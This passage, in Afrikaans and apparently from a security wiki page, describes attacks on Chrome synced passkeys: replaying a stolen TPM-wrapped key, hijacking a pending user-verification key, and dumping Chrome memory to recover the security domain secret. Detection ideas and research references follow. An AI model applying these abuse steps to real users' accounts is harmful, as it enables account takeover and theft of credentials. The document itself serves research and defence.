NCryptSignHash(...)
```

Dit beteken **hardewarebinding verhoed uitvoer vanaf die toestel, maar nie gebruik deur dieselfde gebruiker op die gekompromitteerde endpoint nie**.

### Praktiese misbruikpaaie

1. **Pass-ta-key / toestel-identiteitsaflos**<sup>[[4]](#references)</sup>
   - Enumereer `WebauthnCredentialSpecifics` uit Chrome se LevelDB.
   - Begin ’n passkey-aanmelding en verkry ’n vars WebAuthn-uitdaging.
   - Gebruik die gesteelde `wrapped_identity_private_key`-blob op die slagoffer se TPM om die cloud-authenticator-versoekbinding te onderteken.
   - Stuur die terugontvange assertion deur na die relying party.
   - Dit is veral waardevol wanneer die RP `userVerification=preferred` aanvaar of nie assertions met **`UV=0`** verwerp nie.
2. **Kaping van hangende UV-sleutel**<sup>[[4]](#references)</sup>
   - Dwing heraanboordneming af deur `passkey_enclave_state` te skrap of deur ’n geldige, ondertekende `device/forget`-operasie te stuur.
   - As die aanboordneming die toestel in **`uv_key_pending`** laat, registreer ’n UV-publieke sleutel wat deur die aanvaller beheer word.
   - As die verskaffer nie die attestering / oorsprong van veilige hardeware vir die nuwe UV-sleutel verifieer nie, word latere handtekeninge van die aanvallersleutel as **`UV=1`** behandel.
3. **Diefstal van hoofgeheim / SDS-herwinning**<sup>[[4]](#references)</sup>
   - Dwing herstel of heraansluiting af sodat Chrome die gesinkroniseerde passkey-hoofgeheim ophaal.
   - Let op wanneer `passkey_enclave_state` herskep of gewysig word, en stort dan Chrome se geheue terwyl die gewone teks **security domain secret (SDS)** daarin teenwoordig is.
   - Gebruik die herwonne SDS om die geënkripteerde velde in elke `WebauthnCredentialSpecifics`-rekord te dekripteer en draagbare WebAuthn-private sleutels te herwin.

### DFIR- / opsporingsidees

- Monitor die **skrap/her-skepping** van `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Genereer ’n waarskuwing oor abnormale toegang tot Chrome se **`Sync Data\LevelDB`** deur prosesse wat nie blaaiers is nie.
- Genereer ’n waarskuwing oor **Chrome-geheuestortings** of verdagte geheuetoegang tussen prosesse.
- Ondersoek herhaalde versoeke vir ’n **Google Password Manager-herstel-PIN** of onverwagte heraanboordneming.
- Onthou dat WebAuthn se **`signCount`** dikwels nie nuttig is vir gesinkroniseerde passkeys nie, omdat dit konstant kan bly; daarom is klassieke kloonopsporing swak.

## References

- [1] [Unit 42 – ’n Ondersoek na jare se onopgespoorde operasies wat sektore met hoë waarde geteiken het](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA-makro-phishing via SMTP → hMailServer-geloofsbriewe-dekripsie → Veeam CVE-2023-27532 na SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Binne Ink Dragon: die onthulling van die aflosnetwerk en die interne werking van ’n geheimsinnige offensiewe operasie](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Slaag die passkey: ’n nuwe aanvalsoppervlak in wagwoordlose verifikasie](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG-sleutelberging](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Aanvalle op Microsoft-stelsels en -netwerke](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Hoe die Active Directory-databewaarplek werklik werk: binne NTDS.dit (Deel 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Afstandelike Lsass-wagwoordstorting](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho brei sy kuberspioenasie-arsenaal uit met die Still Toolkit](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW-funksie en `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B`-rugsteunmodus](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – beëindiging van aktiewe sessies](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard en Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Beskerming en bestuur van geloofsbriewe](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
{{#include ../../banners/hacktricks-training.md}}
